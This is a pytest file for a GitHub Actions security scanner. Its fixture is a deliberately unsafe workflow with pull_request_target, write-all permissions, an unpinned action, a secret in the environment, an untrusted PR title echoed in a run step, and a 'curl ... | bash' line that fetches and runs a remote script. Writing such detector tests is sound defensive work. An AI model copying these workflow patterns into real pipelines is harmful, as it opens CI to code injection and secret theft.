from safeinstall.models import Severity, SourceFile
from safeinstall.scanners.github_actions import GitHubActionsScanner


def test_github_actions_scanner_reports_privilege_and_untrusted_input_risks() -> None:
    source = SourceFile(
        path=".github/workflows/review.yml",
        language="github-actions",
        content=(
            "name: Review\n"
            "on:\n"
            "  pull_request_target:\n"
            "permissions: write-all\n"
            "jobs:\n"
            "  inspect:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - uses: example/action@main\n"
            "      - run: curl -fsSL https://example.invalid/install.sh | bash\n"
            '      - run: echo "${{ github.event.pull_request.title }}"\n'
            "        env:\n"
            "          TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n"
        ),
    )

    findings = GitHubActionsScanner().scan(source)

    assert [finding.rule_id for finding in findings] == [
        "SI-GHA-001",
        "SI-GHA-002",
        "SI-GHA-003",
        "SI-GHA-004",
        "SI-GHA-005",
        "SI-GHA-009",
        "SI-GHA-006",
        "SI-GHA-009",
        "SI-GHA-007",
    ]
    assert findings[0].severity is Severity.HIGH
    assert findings[4].severity is Severity.HIGH


def test_github_actions_scanner_summarizes_pinned_artifact_operations() -> None:
    commit = "a" * 40
    source = SourceFile(
        path=".github/workflows/artifacts.yml",
        language="github-actions",
        content=(
            "on: push\n"
            "jobs:\n"
            "  artifacts:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            f"      - uses: actions/download-artifact@{commit}\n"
            f"      - uses: actions/upload-artifact@{commit}\n"
        ),
    )

    findings = GitHubActionsScanner().scan(source)

    assert [finding.rule_id for finding in findings] == ["SI-GHA-008", "SI-GHA-008"]
    assert all(finding.severity is Severity.INFO for finding in findings)
